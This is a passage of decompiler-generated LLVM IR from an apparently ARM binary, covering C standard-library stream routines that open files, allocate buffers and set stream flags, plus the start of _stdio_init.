  br i1 %v7_fe40, label %bb30, label %dec_label_pc_fe4c

bb30:                                             ; preds = %dec_label_pc_fe40
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_fe7c

dec_label_pc_fe4c:                                ; preds = %dec_label_pc_fe40, %dec_label_pc_ff04, %dec_label_pc_fed8
  %v0_fe4c = call i32 @__errno_location()
  store i32 %v0_fe4c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_fe54 = load i32, i32* @r8, align 4
  %v2_fe54 = icmp eq i32 %v0_fe54, 0
  store i1 %v2_fe54, i1* %cpsr_z.global-to-local, align 1
  %v2_fe58 = inttoptr i32 %v0_fe4c to i32*
  store i32 22, i32* %v2_fe58, align 4
  br i1 %v2_fe54, label %dec_label_pc_100cc, label %dec_label_pc_fe60

dec_label_pc_fe60:                                ; preds = %dec_label_pc_ff28._crit_edge, %dec_label_pc_fe4c
  %v0_fe60 = load i32, i32* @r8, align 4
  %v1_fe60 = add i32 %v0_fe60, 1
  %v2_fe60 = inttoptr i32 %v1_fe60 to i8*
  %v3_fe60 = load i8, i8* %v2_fe60, align 1
  %v4_fe60 = zext i8 %v3_fe60 to i32
  store i32 %v4_fe60, i32* %r3.global-to-local, align 4
  %v1_fe64 = and i32 %v4_fe60, 32
  %v2_fe64 = icmp eq i32 %v1_fe64, 0
  store i1 %v2_fe64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe64, label %dec_label_pc_100cc, label %dec_label_pc_fe6c

dec_label_pc_fe6c:                                ; preds = %dec_label_pc_fe60
  store i32 %v0_fe60, i32* @r0, align 4
  %v0_fe70 = call i32 @free()
  store i32 %v0_fe70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100cc

dec_label_pc_fe78:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fe7c

dec_label_pc_fe7c:                                ; preds = %bb, %bb30, %dec_label_pc_fe78
  %v1_fe94 = phi i32 [ 1089, %bb30 ], [ 577, %bb ], [ 1, %dec_label_pc_fe78 ]
  %v1_fe7c = add i32 %v0_fe18, 1
  %v2_fe7c = inttoptr i32 %v1_fe7c to i8*
  %v3_fe7c = load i8, i8* %v2_fe7c, align 1
  %v7_fe80 = icmp eq i8 %v3_fe7c, 98
  store i1 %v7_fe80, i1* %cpsr_z.global-to-local, align 1
  %v1_fe7c.v0_fe18 = select i1 %v7_fe80, i32 %v1_fe7c, i32 %v0_fe18
  store i32 %v1_fe7c.v0_fe18, i32* %r3.global-to-local, align 4
  %v1_fe8c = add i32 %v1_fe7c.v0_fe18, 1
  %v2_fe8c = inttoptr i32 %v1_fe8c to i8*
  %v3_fe8c = load i8, i8* %v2_fe8c, align 1
  %v4_fe8c = zext i8 %v3_fe8c to i32
  store i32 %v4_fe8c, i32* %r3.global-to-local, align 4
  %v7_fe90 = icmp eq i8 %v3_fe8c, 43
  store i1 %v7_fe90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fe90, label %bb33, label %.thread4

bb33:                                             ; preds = %dec_label_pc_fe7c
  store i32 %v1_fe94, i32* %r3.global-to-local, align 4
  %v2_fe98 = add nuw nsw i32 %v1_fe94, 1
  store i32 %v2_fe98, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_fe7c, %bb33
  %v2_fe9c = icmp eq i32 %v0_fe28, 0
  store i1 %v2_fe9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fe9c, label %dec_label_pc_fea4, label %dec_label_pc_fed0

dec_label_pc_fea4:                                ; preds = %.thread4
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_fea8 = call i32 @malloc(i32 80)
  store i32 %v1_fea8, i32* %r0.global-to-local, align 4
  store i32 %v1_fea8, i32* @r8, align 4
  %v3_feac = icmp eq i32 %v1_fea8, 0
  store i1 %v3_feac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_feac, label %dec_label_pc_100d0, label %dec_label_pc_feb4

dec_label_pc_feb4:                                ; preds = %dec_label_pc_fea4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v3_febc = add i32 %v1_fea8, 1
  %v4_febc = inttoptr i32 %v3_febc to i8*
  store i8 32, i8* %v4_febc, align 1
  %v0_fec0 = load i32, i32* %r2.global-to-local, align 4
  %v1_fec0 = load i32, i32* @r8, align 4
  %v2_fec0 = add i32 %v1_fec0, 8
  %v3_fec0 = inttoptr i32 %v2_fec0 to i32*
  store i32 %v0_fec0, i32* %v3_fec0, align 4
  %v0_fec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_fec4 = trunc i32 %v0_fec4 to i8
  %v2_fec4 = load i32, i32* @r8, align 4
  %v3_fec4 = inttoptr i32 %v2_fec4 to i8*
  store i8 %v1_fec4, i8* %v3_fec4, align 1
  %v0_fec8 = load i32, i32* @r8, align 4
  %v1_fec8 = add i32 %v0_fec8, 56
  store i32 %v1_fec8, i32* @r0, align 4
  %v0_fecc = call i32 @__stdio_init_mutex()
  store i32 %v0_fecc, i32* %r0.global-to-local, align 4
  %v0_fed0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fed0

dec_label_pc_fed0:                                ; preds = %.thread4, %dec_label_pc_feb4
  %v0_ff28 = phi i32 [ %v0_fe2c, %.thread4 ], [ %v0_fed0.pre, %dec_label_pc_feb4 ]
  %v1_fed0 = icmp slt i32 %v0_ff28, 0
  %v2_fed0 = icmp eq i32 %v0_ff28, 0
  store i1 %v2_fed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_fed0, label %dec_label_pc_ff28, label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %dec_label_pc_fed0
  %v0_fedc = load i32, i32* @r4, align 4
  %v2_fedc = and i32 %v0_fedc, 131075
  %v1_fee0 = add nuw nsw i32 %v2_fedc, 1
  store i32 %v1_fee0, i32* %r2.global-to-local, align 4
  %v0_fee4 = load i32, i32* @r6, align 4
  %v1_fee4 = add i32 %v0_fee4, 1
  %v2_fee8 = and i32 %v1_fee4, %v1_fee0
  store i32 %v2_fee8, i32* %r3.global-to-local, align 4
  %v9_feec = icmp eq i32 %v2_fee8, %v1_fee0
  store i1 %v9_feec, i1* %cpsr_z.global-to-local, align 1
  %v1_fef0 = load i32, i32* @r8, align 4
  %v2_fef0 = add i32 %v1_fef0, 4
  %v3_fef0 = inttoptr i32 %v2_fef0 to i32*
  store i32 %v0_ff28, i32* %v3_fef0, align 4
  br i1 %v9_feec, label %dec_label_pc_fef8, label %dec_label_pc_fe4c

dec_label_pc_fef8:                                ; preds = %dec_label_pc_fed8
  %v0_fef8 = load i32, i32* @r4, align 4
  %v1_fef8 = load i32, i32* @r6, align 4
  %v2_fef8 = sub i32 -1, %v1_fef8
  %v3_fef8 = and i32 %v0_fef8, %v2_fef8
  store i32 %v3_fef8, i32* %r3.global-to-local, align 4
  %v1_fefc = and i32 %v3_fef8, 1024
  %v2_fefc = icmp eq i32 %v1_fefc, 0
  store i1 %v2_fefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fefc, label %dec_label_pc_ff1c, label %dec_label_pc_ff04

dec_label_pc_ff04:                                ; preds = %dec_label_pc_fef8
  %v0_ff04 = load i32, i32* @r5, align 4
  store i32 %v0_ff04, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_ff10 = call i32 @__libc_fcntl(i32 %v0_ff04, i32 4)
  store i32 %v2_ff10, i32* %r0.global-to-local, align 4
  %v2_ff14 = icmp eq i32 %v2_ff10, 0
  store i1 %v2_ff14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff14, label %dec_label_pc_ff04.dec_label_pc_ff1c_crit_edge, label %dec_label_pc_fe4c

dec_label_pc_ff04.dec_label_pc_ff1c_crit_edge:    ; preds = %dec_label_pc_ff04
  %v0_ff1c.pre = load i32, i32* @r6, align 4
  %v0_ff20.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_ff04.dec_label_pc_ff1c_crit_edge, %dec_label_pc_fef8
  %v0_ff20 = phi i32 [ %v0_ff20.pre, %dec_label_pc_ff04.dec_label_pc_ff1c_crit_edge ], [ %v0_fef8, %dec_label_pc_fef8 ]
  %v0_ff1c = phi i32 [ %v0_ff1c.pre, %dec_label_pc_ff04.dec_label_pc_ff1c_crit_edge ], [ %v1_fef8, %dec_label_pc_fef8 ]
  %v1_ff1c = and i32 %v0_ff1c, 131072
  store i32 %v1_ff1c, i32* %r3.global-to-local, align 4
  %v2_ff20 = or i32 %v1_ff1c, %v0_ff20
  store i32 %v2_ff20, i32* @r4, align 4
  br label %dec_label_pc_ff4c

dec_label_pc_ff28:                                ; preds = %dec_label_pc_fed0
  %v7_ff28 = icmp eq i32 %v0_ff28, -1
  store i1 %v7_ff28, i1* %cpsr_z.global-to-local, align 1
  %v0_ff34.pre = load i32, i32* @r4, align 4
  br i1 %v7_ff28, label %dec_label_pc_ff28._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_ff28
  %v2_ff2c = or i32 %v0_ff34.pre, 131072
  store i32 %v2_ff2c, i32* @r4, align 4
  br label %dec_label_pc_ff28._crit_edge

dec_label_pc_ff28._crit_edge:                     ; preds = %dec_label_pc_ff28, %bb34
  %v0_ff34 = phi i32 [ %v2_ff2c, %bb34 ], [ %v0_ff34.pre, %dec_label_pc_ff28 ]
  %v0_ff30 = load i32, i32* @r6, align 4
  store i32 %v0_ff30, i32* %r0.global-to-local, align 4
  store i32 %v0_ff34, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_ff3c = inttoptr i32 %v0_ff30 to i8*
  %v3_ff3c = call i32 @__libc_open(i8* %v2_ff3c, i32 %v0_ff34)
  store i32 %v3_ff3c, i32* %r0.global-to-local, align 4
  %v1_ff40 = icmp slt i32 %v3_ff3c, 0
  %v2_ff40 = icmp eq i32 %v3_ff3c, 0
  store i1 %v2_ff40, i1* %cpsr_z.global-to-local, align 1
  %v1_ff44 = load i32, i32* @r8, align 4
  %v2_ff44 = add i32 %v1_ff44, 4
  %v3_ff44 = inttoptr i32 %v2_ff44 to i32*
  store i32 %v3_ff3c, i32* %v3_ff44, align 4
  br i1 %v1_ff40, label %dec_label_pc_fe60, label %dec_label_pc_ff4c

dec_label_pc_ff4c:                                ; preds = %dec_label_pc_ff28._crit_edge, %dec_label_pc_ff1c
  %v0_ff4c = load i32, i32* @r8, align 4
  %v1_ff4c = inttoptr i32 %v0_ff4c to i32*
  %v2_ff4c = load i32, i32* %v1_ff4c, align 4
  %v1_ff50 = and i32 %v2_ff4c, 8192
  store i32 %v1_ff50, i32* %r3.global-to-local, align 4
  %v3_ff541 = udiv i32 %v1_ff50, 256
  store i32 %v3_ff541, i32* %r2.global-to-local, align 4
  %v1_ff58 = trunc i32 %v3_ff541 to i8
  %v3_ff58 = add i32 %v0_ff4c, 1
  %v4_ff58 = inttoptr i32 %v3_ff58 to i8*
  store i8 %v1_ff58, i8* %v4_ff58, align 1
  %v0_ff5c = load i32, i32* %r3.global-to-local, align 4
  %v1_ff5c = trunc i32 %v0_ff5c to i8
  %v2_ff5c = load i32, i32* @r8, align 4
  %v3_ff5c = inttoptr i32 %v2_ff5c to i8*
  store i8 %v1_ff5c, i8* %v3_ff5c, align 1
  %v0_ff60 = load i32, i32* @r4, align 4
  %v1_ff60 = and i32 %v0_ff60, 131072
  store i32 %v1_ff60, i32* %r1.global-to-local, align 4
  %v2_ff60 = icmp eq i32 %v1_ff60, 0
  store i1 %v2_ff60, i1* %cpsr_z.global-to-local, align 1
  %v0_ff64 = load i32, i32* @r8, align 4
  %v1_ff64 = add i32 %v0_ff64, 1
  %v2_ff64 = inttoptr i32 %v1_ff64 to i8*
  %v3_ff64 = load i8, i8* %v2_ff64, align 1
  %v4_ff64 = zext i8 %v3_ff64 to i32
  %v1_ff68 = inttoptr i32 %v0_ff64 to i8*
  %v2_ff68 = load i8, i8* %v1_ff68, align 1
  %v3_ff68 = zext i8 %v2_ff68 to i32
  store i32 %v3_ff68, i32* %r3.global-to-local, align 4
  br i1 %v2_ff60, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_ff4c
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_ff4c, %bb35
  %v0_ff7c = phi i32 [ 0, %dec_label_pc_ff4c ], [ 32768, %bb35 ]
  %v1_ff70 = and i32 %v0_ff60, 1024
  store i32 %v1_ff70, i32* %r0.global-to-local, align 4
  %v4_ff78 = mul nuw nsw i32 %v4_ff64, 256
  %v5_ff78 = or i32 %v3_ff68, %v4_ff78
  %v2_ff7c = or i32 %v0_ff7c, %v1_ff70
  store i32 %v2_ff7c, i32* %r1.global-to-local, align 4
  %v2_ff84 = or i32 %v5_ff78, %v2_ff7c
  %v1_ff74 = mul i32 %v0_ff60, 16
  %v1_ff80 = and i32 %v1_ff74, 48
  %v1_ff88 = add nuw nsw i32 %v1_ff80, 16
  %v4_ff8c = xor i32 %v1_ff88, 48
  %v5_ff8c = or i32 %v2_ff84, %v4_ff8c
  store i32 %v5_ff8c, i32* %r3.global-to-local, align 4
  %v3_ff9019 = udiv i32 %v2_ff84, 256
  store i32 %v3_ff9019, i32* %r2.global-to-local, align 4
  %v1_ff94 = trunc i32 %v3_ff9019 to i8
  store i8 %v1_ff94, i8* %v2_ff64, align 1
  %v0_ff98 = load i32, i32* %r3.global-to-local, align 4
  %v1_ff98 = trunc i32 %v0_ff98 to i8
  %v2_ff98 = load i32, i32* @r8, align 4
  %v3_ff98 = inttoptr i32 %v2_ff98 to i8*
  store i8 %v1_ff98, i8* %v3_ff98, align 1
  %v0_ff9c = call i32 @__errno_location()
  store i32 %v0_ff9c, i32* %r0.global-to-local, align 4
  %v0_ffa0 = load i32, i32* @r8, align 4
  %v1_ffa0 = add i32 %v0_ffa0, 1
  %v2_ffa0 = inttoptr i32 %v1_ffa0 to i8*
  %v3_ffa0 = load i8, i8* %v2_ffa0, align 1
  %v4_ffa0 = zext i8 %v3_ffa0 to i32
  store i32 %v4_ffa0, i32* %r3.global-to-local, align 4
  %v1_ffa4 = inttoptr i32 %v0_ffa0 to i8*
  %v2_ffa4 = load i8, i8* %v1_ffa4, align 1
  %v3_ffa4 = zext i8 %v2_ffa4 to i32
  store i32 %v0_ff9c, i32* @r6, align 4
  %v1_ffac = add i32 %v0_ffa0, 4
  %v2_ffac = inttoptr i32 %v1_ffac to i32*
  %v3_ffac = load i32, i32* %v2_ffac, align 4
  store i32 %v3_ffac, i32* @r0, align 4
  %v4_ffb0 = mul nuw nsw i32 %v4_ffa0, 256
  %v5_ffb0 = or i32 %v3_ffa4, %v4_ffb0
  store i32 %v5_ffb0, i32* @r4, align 4
  %v1_ffb4 = inttoptr i32 %v0_ff9c to i32*
  %v2_ffb4 = load i32, i32* %v1_ffb4, align 4
  store i32 %v2_ffb4, i32* @r5, align 4
  %v1_ffb8 = call i32 @isatty(i32 %v3_ffac)
  store i32 %v1_ffb8, i32* %r0.global-to-local, align 4
  %v0_ffbc = load i32, i32* @r4, align 4
  %v4_ffbc = mul i32 %v1_ffb8, 256
  %v5_ffbc = or i32 %v0_ffbc, %v4_ffbc
  store i32 %v5_ffbc, i32* @r4, align 4
  %v3_ffc0 = sdiv i32 %v5_ffbc, 256
  store i32 %v3_ffc0, i32* %r3.global-to-local, align 4
  %v1_ffc4 = trunc i32 %v3_ffc0 to i8
  %v2_ffc4 = load i32, i32* @r8, align 4
  %v3_ffc4 = add i32 %v2_ffc4, 1
  %v4_ffc4 = inttoptr i32 %v3_ffc4 to i8*
  store i8 %v1_ffc4, i8* %v4_ffc4, align 1
  %v0_ffc8 = load i32, i32* @r4, align 4
  %v1_ffc8 = trunc i32 %v0_ffc8 to i8
  %v2_ffc8 = load i32, i32* @r8, align 4
  %v3_ffc8 = inttoptr i32 %v2_ffc8 to i8*
  store i8 %v1_ffc8, i8* %v3_ffc8, align 1
  %v0_ffcc = load i32, i32* @r5, align 4
  %v1_ffcc = load i32, i32* @r6, align 4
  %v2_ffcc = inttoptr i32 %v1_ffcc to i32*
  store i32 %v0_ffcc, i32* %v2_ffcc, align 4
  %v0_ffd0 = load i32, i32* @r8, align 4
  %v1_ffd0 = add i32 %v0_ffd0, 8
  %v2_ffd0 = inttoptr i32 %v1_ffd0 to i32*
  %v3_ffd0 = load i32, i32* %v2_ffd0, align 4
  store i32 %v3_ffd0, i32* %r3.global-to-local, align 4
  %v2_ffd4 = icmp eq i32 %v3_ffd0, 0
  store i1 %v2_ffd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffd4, label %dec_label_pc_ffdc, label %bb37

dec_label_pc_ffdc:                                ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_ffe0 = call i32 @malloc(i32 4096)
  store i32 %v1_ffe0, i32* %r0.global-to-local, align 4
  %v2_ffe4 = icmp eq i32 %v1_ffe0, 0
  store i1 %v2_ffe4, i1* %cpsr_z.global-to-local, align 1
  %v1_fff8.pre = load i32, i32* @r8, align 4
  br i1 %v2_ffe4, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_ffdc
  %v2_fff820 = add i32 %v1_fff8.pre, 8
  %v3_fff821 = inttoptr i32 %v2_fff820 to i32*
  store i32 0, i32* %v3_fff821, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_ffdc
  %v2_ffe8 = inttoptr i32 %v1_fff8.pre to i32*
  %v3_ffe8 = load i32, i32* %v2_ffe8, align 4
  %v2_ffec = or i32 %v3_ffe8, 16384
  store i32 %v2_ffec, i32* %r3.global-to-local, align 4
  %v2_fff0 = add i32 %v1_ffe0, 4096
  store i32 %v2_fff0, i32* %r2.global-to-local, align 4
  %v4_fff4 = sdiv i32 %v2_ffec, 256
  store i32 %v4_fff4, i32* %r1.global-to-local, align 4
  %v2_fff8 = add i32 %v1_fff8.pre, 8
  %v3_fff8 = inttoptr i32 %v2_fff8 to i32*
  store i32 %v1_ffe0, i32* %v3_fff8, align 4
  %v1_fffc = load i32, i32* %r2.global-to-local, align 4
  %v2_fffc = load i32, i32* @r8, align 4
  %v3_fffc = add i32 %v2_fffc, 12
  %v4_fffc = inttoptr i32 %v3_fffc to i32*
  store i32 %v1_fffc, i32* %v4_fffc, align 4
  %v1_10000 = load i32, i32* %r1.global-to-local, align 4
  %v2_10000 = trunc i32 %v1_10000 to i8
  %v3_10000 = load i32, i32* @r8, align 4
  %v4_10000 = add i32 %v3_10000, 1
  %v5_10000 = inttoptr i32 %v4_10000 to i8*
  store i8 %v2_10000, i8* %v5_10000, align 1
  %v0_10004.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10004.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_10004 = load i32, i32* %r3.global-to-local, align 4
  %v2_10004 = trunc i32 %v1_10004 to i8
  %v3_10004 = load i32, i32* @r8, align 4
  %v4_10004 = inttoptr i32 %v3_10004 to i8*
  store i8 %v2_10004, i8* %v4_10004, align 1
  %v0_10008.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10008.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_10008 = load i32, i32* @r8, align 4
  %v3_10008 = add i32 %v2_10008, 12
  %v4_10008 = inttoptr i32 %v3_10008 to i32*
  store i32 %v1_ffe0, i32* %v4_10008, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23e48.607 to i32), i32* %r3.global-to-local, align 4
  %v2_10014 = load i32, i32* @r8, align 4
  %v3_10014 = add i32 %v2_10014, 2
  %v4_10014 = inttoptr i32 %v3_10014 to i8*
  store i8 0, i8* %v4_10014, align 1
  %v0_10018 = load i32, i32* @r8, align 4
  %v1_10018 = add i32 %v0_10018, 1
  %v2_10018 = inttoptr i32 %v1_10018 to i8*
  %v3_10018 = load i8, i8* %v2_10018, align 1
  %v4_10018 = zext i8 %v3_10018 to i32
  store i32 %v4_10018, i32* %r2.global-to-local, align 4
  %v2_1001c = load i32, i32* @global_var_23e48.607, align 4
  store i32 %v2_1001c, i32* %r1.global-to-local, align 4
  %v1_10020 = add i32 %v0_10018, 8
  %v2_10020 = inttoptr i32 %v1_10020 to i32*
  %v3_10020 = load i32, i32* %v2_10020, align 4
  store i32 %v3_10020, i32* %r3.global-to-local, align 4
  %v1_10024 = and i32 %v4_10018, 32
  %v2_10024 = icmp eq i32 %v1_10024, 0
  store i1 %v2_10024, i1* %cpsr_z.global-to-local, align 1
  %v2_10028 = add i32 %v0_10018, 20
  %v3_10028 = inttoptr i32 %v2_10028 to i32*
  store i32 %v3_10020, i32* %v3_10028, align 4
  %v0_1002c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002c = load i32, i32* @r8, align 4
  %v2_1002c = add i32 %v1_1002c, 44
  %v3_1002c = inttoptr i32 %v2_1002c to i32*
  store i32 %v0_1002c, i32* %v3_1002c, align 4
  %v0_10030 = load i32, i32* %r1.global-to-local, align 4
  %v1_10030 = load i32, i32* @r8, align 4
  %v2_10030 = add i32 %v1_10030, 52
  %v3_10030 = inttoptr i32 %v2_10030 to i32*
  store i32 %v0_10030, i32* %v3_10030, align 4
  %v0_10034 = load i32, i32* %r3.global-to-local, align 4
  %v1_10034 = load i32, i32* @r8, align 4
  %v2_10034 = add i32 %v1_10034, 24
  %v3_10034 = inttoptr i32 %v2_10034 to i32*
  store i32 %v0_10034, i32* %v3_10034, align 4
  %v0_10038 = load i32, i32* %r3.global-to-local, align 4
  %v1_10038 = load i32, i32* @r8, align 4
  %v2_10038 = add i32 %v1_10038, 28
  %v3_10038 = inttoptr i32 %v2_10038 to i32*
  store i32 %v0_10038, i32* %v3_10038, align 4
  %v0_1003c = load i32, i32* %r3.global-to-local, align 4
  %v1_1003c = load i32, i32* @r8, align 4
  %v2_1003c = add i32 %v1_1003c, 16
  %v3_1003c = inttoptr i32 %v2_1003c to i32*
  store i32 %v0_1003c, i32* %v3_1003c, align 4
  br i1 %v2_10024, label %dec_label_pc_100d0, label %dec_label_pc_10044

dec_label_pc_10044:                               ; preds = %bb37
  %v2_10044 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10044, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23e30.594 to i32), i32* %r2.global-to-local, align 4
  %v1_1005c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_23e30.594 to i32), i32* %r0.global-to-local, align 4
  %v1_1006c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_23e18.613 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_fe20, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_13774.590 to i32), i32* %r1.global-to-local, align 4
  %v1_10080 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_23e18.613 to i32), i32* %r0.global-to-local, align 4
  %v1_1008c = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32** @global_var_23e14.616 to i32), i32* %r2.global-to-local, align 4
  %v2_10094 = load i32, i32* bitcast (i32** @global_var_23e14.616 to i32*), align 4
  store i32 %v2_10094, i32* %r3.global-to-local, align 4
  store i32 %v2_fe20, i32* @r0, align 4
  %v1_1009c = load i32, i32* @r8, align 4
  %v2_1009c = add i32 %v1_1009c, 32
  %v3_1009c = inttoptr i32 %v2_1009c to i32*
  store i32 %v2_10094, i32* %v3_1009c, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_100a8 = load i32, i32* @r8, align 4
  %v1_100a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_100a8 = inttoptr i32 %v1_100a8 to i32*
  store i32 %v0_100a8, i32* %v2_100a8, align 4
  %v1_100b0 = call i32 @__pthread_return_void()
  store i32 %v2_10044, i32* @r0, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 65736, i32* @lr, align 4
  %v1_100c4 = call i32 @__pthread_return_void()
  store i32 %v1_100c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100d0

dec_label_pc_100cc:                               ; preds = %dec_label_pc_fe60, %dec_label_pc_fe4c, %dec_label_pc_fe6c
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_100d0

dec_label_pc_100d0:                               ; preds = %bb37, %dec_label_pc_fea4, %dec_label_pc_10044, %dec_label_pc_100cc
  %v0_100d0 = load i32, i32* @r8, align 4
  store i32 %v0_100d0, i32* %r0.global-to-local, align 4
  %v2_100d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_100d8, i32* @r4, align 4
  store i32 %v6_fe14, i32* @r5, align 4
  store i32 %v9_fe14, i32* @r6, align 4
  store i32 %v15_fe14, i32* @r8, align 4
  ret i32 %v0_100d0

; uselistorder directives
  uselistorder i32 %v1_fff8.pre, { 1, 0, 2 }
  uselistorder i32 %v3_ffc0, { 1, 0 }
  uselistorder i32 %v3_ff541, { 1, 0 }
  uselistorder i32 %v0_ff34, { 1, 0 }
  uselistorder i1 %v7_ff28, { 1, 0 }
  uselistorder i32 %v1_fef8, { 1, 0 }
  uselistorder i32 %v0_fef8, { 1, 0 }
  uselistorder i32 %v1_fee0, { 1, 0, 2 }
  uselistorder i32 %v1_fe94, { 1, 0 }
  uselistorder i1 %v7_fe40, { 1, 0 }
  uselistorder i1 %v7_fe34, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3, 4, 5, 7, 6, 8, 10, 9, 12, 11, 14, 13, 15, 17, 16, 18, 19 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 16384, { 18, 4, 11, 5, 12, 6, 13, 2, 14, 3, 15, 0, 16, 1, 17, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_100d0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100cc, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_ff28._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_fed0, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_fe7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fe4c, { 1, 2, 0 }
}

define i32 @"$d.2"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100dc:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_100dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_100dc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_100dc
  %v3_100e4 = and i32 %arg4, %arg3
  store i32 %v3_100e4, i32* %r0.global-to-local, align 4
  %v2_100e8 = trunc i32 %v3_100e4 to i16
  %v4_100e8 = inttoptr i32 %v3_100e4 to i16*
  store i16 %v2_100e8, i16* %v4_100e8, align 2
  %v5_100e8 = load i32, i32* @r6, align 4
  %v6_100e8 = load i32, i32* %r0.global-to-local, align 4
  %v7_100e8 = sub i32 %v6_100e8, %v5_100e8
  store i32 %v7_100e8, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_100dc, %bb
  %v8_100e8 = phi i32 [ %tmp, %dec_label_pc_100dc ], [ %v7_100e8, %bb ]
  ret i32 %v8_100e8

; uselistorder directives
  uselistorder i32 %v3_100e4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1010c = load i32, i32* @r4, align 4
  store i32 %v3_1010c, i32* %stack_var_-24, align 4
  %v9_1010c = load i32, i32* @r6, align 4
  %v0_10110 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_23e4c.583 to i32), i32* @r4, align 4
  %v3_10118 = load i8, i8* @global_var_23e4d.619, align 1
  %v4_10118 = zext i8 %v3_10118 to i32
  %v2_1011c = load i8, i8* bitcast (i8** @global_var_23e4c.583 to i8*), align 4
  %v3_1011c = zext i8 %v2_1011c to i32
  store i32 %v0_10110, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_10128 = mul nuw nsw i32 %v4_10118, 256
  %v5_10128 = or i32 %v3_1011c, %v4_10128
  store i32 %v5_10128, i32* @r6, align 4
  %v1_1012c = inttoptr i32 %v0_10110 to i32*
  %v2_1012c = load i32, i32* %v1_1012c, align 4
  store i32 %v2_1012c, i32* %r8.global-to-local, align 4
  %v1_10130 = call i32 @isatty(i32 0)
  %v1_10134 = sub i32 1, %v1_10130
  %v0_10138 = load i32, i32* @r6, align 4
  %v4_10138 = mul i32 %v1_10134, 256
  %v5_10138 = xor i32 %v4_10138, %v0_10138
